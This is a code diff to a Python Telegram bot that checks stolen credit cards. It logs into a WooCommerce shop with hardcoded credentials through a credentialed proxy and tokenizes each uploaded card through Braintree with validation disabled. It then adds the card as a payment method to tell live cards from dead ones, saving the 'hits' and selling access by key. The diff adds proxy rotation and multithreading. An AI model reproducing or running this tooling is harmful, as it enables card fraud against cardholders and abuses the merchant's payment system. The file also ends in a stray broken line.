@@ -1,4 +1,4 @@
-import requests, re, time, threading, base64
+import requests, re, time, threading, base64, random
 from bs4 import BeautifulSoup
 from colorama import Fore, init
 import telebot
@@ -6,45 +6,74 @@ from hh import keep_alive
 
 init(autoreset=True)
 
-# ===================== PROXY =====================
-proxies_list = ["http://naveed:Qwerty_123ABC@196.244.48.124:12345"]
+# ===================== PROXIES =====================
+proxies_list = [
+    "http://naveed:Qwerty_123ABC@196.244.48.124:12345",
+    # Add more proxies here if you have
+]
 
 def get_proxy():
-    return {"http": proxies_list[0], "https": proxies_list[0]}
+    if not proxies_list:
+        print(Fore.RED + "[PROXY] No proxy loaded!")
+        return None
+    proxy = random.choice(proxies_list)
+    print(Fore.CYAN + f"[PROXY] Using: {proxy}")
+    return {"http": proxy, "https": proxy}
 
-# ===================== CHECKER =====================
+# ===================== CHECKER WITH FULL LOGS =====================
 def Tele(cx):
     proxy = get_proxy()
+    print(Fore.YELLOW + f"[CHECKING] {cx}")
+    
     try:
         cc, mes, ano, cvv = cx.split("|")
         if len(ano) == 4: ano = ano[2:]
 
         r = requests.Session()
-        r.proxies = proxy
+        if proxy: r.proxies = proxy
         ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
 
         headers = {'User-Agent': ua}
 
+        print(Fore.BLUE + "[LOG] Step 1: Opening site...")
         r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
-        login_page = r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
-        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.+?)"', login_page.text).group(1)
 
+        login_page = r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
+        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.+?)"', login_page.text)
+        if not login_nonce:
+            print(Fore.RED + "[ERROR] Login nonce not found!")
+            return "Login Failed"
+        login_nonce = login_nonce.group(1)
+
+        print(Fore.BLUE + "[LOG] Step 2: Logging in...")
         r.post('https://www.woolroots.com/my-account/', data={
             'username': 'Chitnge228', 'password': 'Chitnge834',
             'woocommerce-login-nonce': login_nonce, '_wp_http_referer': '/my-account/', 'login': 'Log in'
         }, headers=headers, timeout=20)
 
+        print(Fore.BLUE + "[LOG] Step 3: Opening payment page...")
         add_page = r.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers, timeout=20)
-        client_nonce = re.search(r'"client_token_nonce":"(.+?)"', add_page.text).group(1)
+        client_nonce = re.search(r'"client_token_nonce":"(.+?)"', add_page.text)
+        if not client_nonce:
+            print(Fore.RED + "[ERROR] Client nonce failed")
+            return "Client Token Failed"
+        client_nonce = client_nonce.group(1)
 
+        print(Fore.BLUE + "[LOG] Step 4: Getting Braintree Token...")
         token_resp = r.post('https://www.woolroots.com/wp-admin/admin-ajax.php', 
                            data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}, 
                            headers=headers, timeout=20)
 
-        bt_data = re.search(r'"data":"(.+?)"', token_resp.text).group(1)
+        bt_data = re.search(r'"data":"(.+?)"', token_resp.text)
+        if not bt_data:
+            print(Fore.RED + "[ERROR] Braintree data failed")
+            return "Braintree Failed"
+        bt_data = bt_data.group(1)
+
         decoded = base64.b64decode(bt_data).decode('utf-8')
         auth = re.search(r'"authorizationFingerprint":"(.+?)"', decoded).group(1)
 
+        print(Fore.BLUE + "[LOG] Step 5: Tokenizing card...")
         json_data = {
             "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token }}",
             "variables": {"input": {"creditCard": {"number": cc,"expirationMonth": mes,"expirationYear": ano,"cvv": cvv},"options": {"validate": False}}},
@@ -58,6 +87,7 @@ def Tele(cx):
 
         nonce = tokenize.json()['data']['tokenizeCreditCard']['token']
 
+        print(Fore.BLUE + "[LOG] Step 6: Adding payment method...")
         final_page = r.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers, timeout=20)
         add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.+?)"', final_page.text).group(1)
 
@@ -69,14 +99,18 @@ def Tele(cx):
         }, headers=headers, timeout=25)
 
         if "New payment method added" in response.text or "81724" in response.text:
+            print(Fore.GREEN + f"[HIT] {cc} → Approved!")
             return "Approved - New Card Added"
         elif "avs" in response.text.lower():
+            print(Fore.YELLOW + f"[AVS] {cc}")
             return "AVS Declined"
         else:
+            print(Fore.RED + f"[DECLINED] {cc}")
             return "Declined"
 
     except Exception as e:
-        return f"Error: {str(e)[:80]}"
+        print(Fore.RED + f"[ERROR] {cx} → {str(e)}")
+        return f"Error: {str(e)[:100]}"
 
 # ===================== BOT =====================
 sto = {"stop": False}
@@ -88,7 +122,7 @@ valid_keys = {"B3-2026-PREMIUM", "SONALI123", "FREE2026", "GATEAU2026"}
 
 @bot.message_handler(commands=["start"])
 def welcome(message):
-    bot.send_message(message.chat.id, "𓆩 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𓆪\nUse /key YOURKEY to activate")
+    bot.send_message(message.chat.id, "𓆩 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𓆪\nAdvanced Logs Active")
 
 @bot.message_handler(commands=["key"])
 def redeem_key(message):
@@ -96,22 +130,33 @@ def redeem_key(message):
         key = message.text.split()[1]
         if key in valid_keys:
             redeemed_users.add(message.chat.id)
-            bot.reply_to(message, "✅ Key Activated Successfully!\nNow send combo file.")
+            bot.reply_to(message, "✅ Key Activated!")
         else:
             bot.reply_to(message, "❌ Invalid Key!")
     except:
         bot.reply_to(message, "Usage: /key YOURKEY")
 
+@bot.message_handler(commands=["addkey"])
+def add_key(message):
+    if message.chat.id != OWNER_ID:
+        return bot.reply_to(message, "❌ Only Owner!")
+    try:
+        new_key = message.text.split()[1]
+        valid_keys.add(new_key)
+        bot.reply_to(message, f"✅ New Key Added: {new_key}")
+    except:
+        bot.reply_to(message, "Usage: /addkey NEWKEY")
+
 @bot.message_handler(content_types=["document"])
 def check(message):
     user_id = message.chat.id
-
     if user_id != OWNER_ID and user_id not in redeemed_users:
-        return bot.reply_to(message, "❌ Access Denied!\nUse /key first.")
+        return bot.reply_to(message, "❌ Access Denied!")
 
     sto["stop"] = False
     name = message.from_user.first_name or "User"
-    
+    print(Fore.MAGENTA + f"\n[NEW SESSION] {name} started checking")
+
     file_info = bot.get_file(message.document.file_id)
     downloaded = bot.download_file(file_info.file_path)
     with open("combo.txt", "wb") as f: f.write(downloaded)
@@ -120,12 +165,12 @@ def check(message):
         cards = [line.strip() for line in f if line.strip()]
 
     ok = 0
-    ko = bot.reply_to(message, f"🔥 Checking Started by {name}\nTotal: {len(cards)}").message_id
+    ko = bot.reply_to(message, f"🔥 Checking Started!\nTotal Cards: {len(cards)}").message_id
 
-    for cc in cards:
-        if sto["stop"]: break
+    def worker(cc):
+        nonlocal ok
+        if sto["stop"]: return
         result = Tele(cc)
-        
         if "Approved" in result or "New Card Added" in result:
             ok += 1
             respo = f'''
@@ -138,15 +183,20 @@ def check(message):
             bot.reply_to(message, respo)
             with open("hit.txt", "a", encoding="utf-8") as f:
                 f.write(respo + "\n\n")
-        
-        try:
-            bot.edit_message_text(f"Progress: {ok} Hits / {len(cards)}", message.chat.id, ko)
-        except:
-            pass
 
-        time.sleep(0.8)
+    threads = []
+    for cc in cards:
+        if sto["stop"]: break
+        t = threading.Thread(target=worker, args=(cc,))
+        threads.append(t)
+        t.start()
+        time.sleep(0.6)
+
+    for t in threads:
+        t.join()
 
     bot.reply_to(message, f"✅ Finished!\nHits: {ok}")
+    print(Fore.GREEN + f"[SESSION END] Hits: {ok}")
 
 @bot.message_handler(commands=["stop"])
 def stopit(message):
@@ -154,5 +204,7 @@ def stopit(message):
     bot.reply_to(message, "✅ Stopped")
 
 keep_alive()
-print("✅ Bot Started Successfully")
+print("✅ Bot Started with Full Logs")
 bot.infinity_polling()
+
+        tokenize
